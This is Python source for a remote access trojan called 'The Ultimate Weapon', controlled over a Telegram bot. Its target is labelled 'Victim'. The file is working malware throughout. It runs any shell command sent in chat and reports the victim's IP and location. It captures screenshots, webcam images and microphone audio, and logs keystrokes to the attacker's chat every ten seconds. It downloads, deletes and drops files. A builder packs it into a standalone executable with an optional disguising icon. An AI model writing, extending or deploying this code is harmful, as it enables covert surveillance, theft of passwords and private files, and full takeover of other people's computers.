import os
import subprocess
import threading
import time
import telebot
import sys
import socket

# Optional modules
HAS_PYAUTO = HAS_CV2 = HAS_AUDIO = HAS_KEYLOGGER = HAS_GEO = False
try: import pyautogui; HAS_PYAUTO = True
except: pass
try: import cv2; HAS_CV2 = True
except: pass
try: import sounddevice as sd; import wavio; HAS_AUDIO = True
except: pass
try: from pynput import keyboard; HAS_KEYLOGGER = True
except: pass
try: import geocoder; HAS_GEO = True
except: pass

# Global variables
keylogger_running = False
key_log = []
keylogger_thread = None
CURRENT_DIR = os.getcwd()
COMMAND_MODE = True
DEVICES = {}
SELECTED_DEVICE = None

# ===== Utility Functions =====
def get_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except: return None

def get_locations():
    ip_text = "Victim : IP not available"
    gps_text = "GPS : Not available"
    ip = get_ip()
    if ip: ip_text = f"Target : {ip}"
    if HAS_GEO:
        try:
            g = geocoder.ip('me')
            if g.ok and g.latlng: gps_text = f"Target Location: {g.latlng[0]}, {g.latlng[1]}"
        except: pass
    return ip_text, gps_text

def run_command(cmd):
    global CURRENT_DIR
    try:
        # handle cd manually
        if cmd.strip().startswith("cd"):
            parts = cmd.strip().split(maxsplit=1)
            if len(parts) == 1:  # sirf "cd"
                return f"📂 Current directory: {CURRENT_DIR}"
            else:
                new_dir = parts[1].strip()
                if not os.path.isabs(new_dir):
                    new_dir = os.path.join(CURRENT_DIR, new_dir)
                if os.path.isdir(new_dir):
                    CURRENT_DIR = os.path.abspath(new_dir)
                    os.chdir(CURRENT_DIR)
                    return f"✅ Changed directory to: {CURRENT_DIR}"
                else:
                    return f"❌ Directory not found: {new_dir}"

        # run other commands
        result = subprocess.run(
            cmd, shell=True, cwd=CURRENT_DIR,
            capture_output=True, text=True
        )
        output = result.stdout + result.stderr
        return output if output else "Command executed but no output."
    except Exception as e:
        return f"❌ Error: {e}"

def take_screenshot(path="screenshot.png"):
    if HAS_PYAUTO:
        try:
            img = pyautogui.screenshot()
            img.save(path)
            return path
        except: pass
    return None

def take_webcam_photo(path="webcam.jpg"):
    if HAS_CV2:
        try:
            cam = cv2.VideoCapture(0)
            ret, frame = cam.read()
            if ret:
                cv2.imwrite(path, frame)
                cam.release()
                return path
            cam.release()
        except: pass
    return None

def record_audio(seconds, path="record.wav"):
    if HAS_AUDIO:
        try:
            fs = 44100
            recording = sd.rec(int(seconds*fs), samplerate=fs, channels=2)
            sd.wait()
            wavio.write(path, recording, fs, sampwidth=2)
            return path
        except: pass
    return None

# ===== Keylogger =====
def keylogger_worker(bot, CHAT_ID):
    global keylogger_running, key_log
    if not HAS_KEYLOGGER: return
    def on_press(key):
        try: key_log.append(key.char)
        except: key_log.append(str(key))
    listener = keyboard.Listener(on_press=on_press)
    listener.start()
    while keylogger_running:
        time.sleep(10)
        if key_log:
            bot.send_message(CHAT_ID,f"🖋 Keylog (last 10s):\n{''.join(key_log)}")
            key_log = []
    listener.stop()

# ===== File Save & Execute =====
def save_and_execute(file_bytes, filename):
    try:
        save_path = os.path.join(os.getcwd(), filename)
        with open(save_path, "wb") as f: f.write(file_bytes)
        try:
            if sys.platform.startswith("win"): subprocess.Popen(save_path, shell=True)
            else:
                subprocess.Popen(["chmod", "+x", save_path])
                subprocess.Popen(["./"+save_path])
            return f"✅ File saved and executed: {filename}"
        except Exception as e: return f"❌ Could not execute: {e}"
    except Exception as e:
        return f"❌ Could not save file: {e}"

# ===== PyInstaller EXE =====
import platform
import PyInstaller.__main__ as pyinst

def build_with_creds(BOT_TOKEN, CHAT_ID, exe_name="tuw_build", icon=None):
    source_file = "setup.py"
    temp_file = "temp_build.py"

    with open(source_file, "r") as src, open(temp_file, "w") as dst:
        dst.write(src.read())
        dst.write("\n\n")
        dst.write(f'BOT_TOKEN = "{BOT_TOKEN}"\n')
        dst.write(f'CHAT_ID = "{CHAT_ID}"\n')
        dst.write("\nif __name__ == '__main__':\n")
        dst.write("    start_bot(BOT_TOKEN, CHAT_ID)\n")

    system = platform.system().lower()
    if system == "windows":
        target_name = exe_name + ".exe"
    else:
        target_name = exe_name

    options = [
        temp_file,
        "--onefile",
        "--name", target_name,
        "--hidden-import", "telebot",
        "--hidden-import", "cv2",
        "--hidden-import", "pynput"
    ]
    if icon and system == "windows":
        options += ["--icon", icon]

    print(f"⚡ Building for {system.capitalize()} as {target_name} ...")
    pyinst.run(options)

    print(f"✅ Build created: dist/{target_name}")
    os.remove(temp_file)

# ===== Bot Main =====
def start_bot(BOT_TOKEN, CHAT_ID):
    global keylogger_running,keylogger_thread,CURRENT_DIR,COMMAND_MODE,DEVICES,SELECTED_DEVICE
    bot = telebot.TeleBot(BOT_TOKEN, threaded=False)
    ip_text, gps_text = get_locations()
    DEVICES["Victim"] = {"os": sys.platform,"user":"Victim","dir": CURRENT_DIR,"ip":ip_text,"gps":gps_text}
    SELECTED_DEVICE = "Victim"

    try:
        bot.send_message(CHAT_ID,f"🚀 Connection Found!\n\n{ip_text}\n\n{gps_text}\n\nType /help to see commands.")
    except Exception as e: print(f"❌ Could not send startup message: {e}")

    # ===== Handlers =====
    @bot.message_handler(commands=['start'])
    def handle_start(message):
        bot.send_message(CHAT_ID,f"🚀 The Ultimate Weapon Bot Started!\n\n{ip_text}\n\n{gps_text}\n\nType /help for commands.")

    @bot.message_handler(commands=['help'])
    def handle_help(message):
        help_text = """
📜 TUW Bot Commands:
/start - Start bot
/help - Show commands
/screenshot - Take screenshot
/webcam - Take webcam photo
/download <filepath> - Download file
/delete <filepath> - Delete file
/record <seconds> - Record audio
/keylogger start|stop - Start/Stop keylogger

Note:
1. Messages are executed as terminal/cmd commands.
2. Uploaded files are saved in the victim's current directory.
"""
        bot.send_message(CHAT_ID, help_text)

    @bot.message_handler(commands=['cmd'])
    def handle_cmd(message):
        cmd = message.text.replace("/cmd","",1).strip()
        output = run_command(cmd)
        if len(output)>4000:
            with open("cmd_output.txt","w") as f: f.write(output)
            with open("cmd_output.txt","rb") as f: bot.send_document(CHAT_ID,f)
            os.remove("cmd_output.txt")
        else:
            bot.send_message(CHAT_ID,f"📰 Output:\n{output}")

    # ===== File download =====
    @bot.message_handler(commands=['download'])
    def handle_download(message):
        try:
            path = message.text.replace("/download","",1).strip()
            if not os.path.exists(path):
                bot.send_message(CHAT_ID,"❌ File not found.")
                return
            with open(path,"rb") as f:
                bot.send_document(CHAT_ID,f)
        except Exception as e:
            bot.send_message(CHAT_ID,f"❌ Error: {e}")

    # ===== File delete =====
    @bot.message_handler(commands=['delete'])
    def handle_delete(message):
        try:
            path = message.text.replace("/delete","",1).strip()
            if not os.path.exists(path):
                bot.send_message(CHAT_ID,"❌ File not found.")
                return
            os.remove(path)
            bot.send_message(CHAT_ID,f"✅ File deleted: {path}")
        except Exception as e:
            bot.send_message(CHAT_ID,f"❌ Error deleting file: {e}")

    @bot.message_handler(commands=['screenshot'])
    def handle_screenshot(message):
        path = take_screenshot()
        if path and os.path.exists(path):
            with open(path,"rb") as f: bot.send_photo(CHAT_ID,f)
            os.remove(path)
        else: bot.send_message(CHAT_ID,"❌ Screenshot failed.")

    @bot.message_handler(commands=['webcam'])
    def handle_webcam(message):
        path = take_webcam_photo()
        if path and os.path.exists(path):
            with open(path,"rb") as f: bot.send_photo(CHAT_ID,f)
            os.remove(path)
        else: bot.send_message(CHAT_ID,"❌ Webcam capture failed.")

    @bot.message_handler(commands=['record'])
    def handle_record(message):
        try:
            sec = int(message.text.replace("/record","",1).strip())
            bot.send_message(CHAT_ID,f"🎤 Recording {sec} seconds...")
            path = record_audio(sec)
            if path and os.path.exists(path):
                with open(path,"rb") as f: bot.send_document(CHAT_ID,f)
                os.remove(path)
            else: bot.send_message(CHAT_ID,"❌ Recording failed.")
        except:
            bot.send_message(CHAT_ID,"❌ Invalid seconds input.")

    @bot.message_handler(commands=['keylogger'])
    def handle_keylogger(message):
        global keylogger_running,keylogger_thread
        args = message.text.split()
        if len(args)<2: bot.send_message(CHAT_ID,"⚠️ Usage: /keylogger start|stop"); return
        action = args[1].lower()
        if action=="start":
            if not HAS_KEYLOGGER: bot.send_message(CHAT_ID,"❌ Keylogger module not available."); return
            if keylogger_running: bot.send_message(CHAT_ID,"⚠️ Keylogger already running."); return
            keylogger_running=True
            keylogger_thread=threading.Thread(target=keylogger_worker,args=(bot,CHAT_ID))
            keylogger_thread.start()
            bot.send_message(CHAT_ID,"✅ Keylogger started.")
        elif action=="stop":
            keylogger_running=False
            bot.send_message(CHAT_ID,"⏹ Keylogger stopped.")
        else: bot.send_message(CHAT_ID,"❌ Invalid action. Use start|stop.")

    # ===== File upload (document & photo) =====
    @bot.message_handler(content_types=['document','photo'])
    def handle_file_upload(message):
        try:
            if message.content_type=='document':
                file_info = bot.get_file(message.document.file_id)
                downloaded_file = bot.download_file(file_info.file_path)
                filename = message.document.file_name
            else:
                file_info = bot.get_file(message.photo[-1].file_id)
                downloaded_file = bot.download_file(file_info.file_path)
                filename = f"photo_{int(time.time())}.jpg"
            save_path = os.path.join(os.getcwd(), filename)
            with open(save_path, "wb") as f: f.write(downloaded_file)
            bot.send_message(CHAT_ID,f"✅ File saved: {filename}")
        except Exception as e:
            bot.send_message(CHAT_ID,f"❌ Error saving file: {e}")

    # ===== Normal messages as shell commands =====
    @bot.message_handler(func=lambda m: True)
    def handle_normal_messages(message):
        global CURRENT_DIR
        text = message.text.strip()
        if text.startswith("cd"):  # agar cd command hai
            output = run_command(text)
            bot.send_message(CHAT_ID, output)
        elif COMMAND_MODE:  # baaki sabko shell command maan lo
            output = run_command(text)
            if len(output) > 4000:
                with open("cmd_output.txt", "w") as f:
                    f.write(output)
                with open("cmd_output.txt", "rb") as f:
                    bot.send_document(CHAT_ID, f)
                os.remove("cmd_output.txt")
            else:
                bot.send_message(CHAT_ID, f"📰 Output:\n{output}")

    bot.infinity_polling()
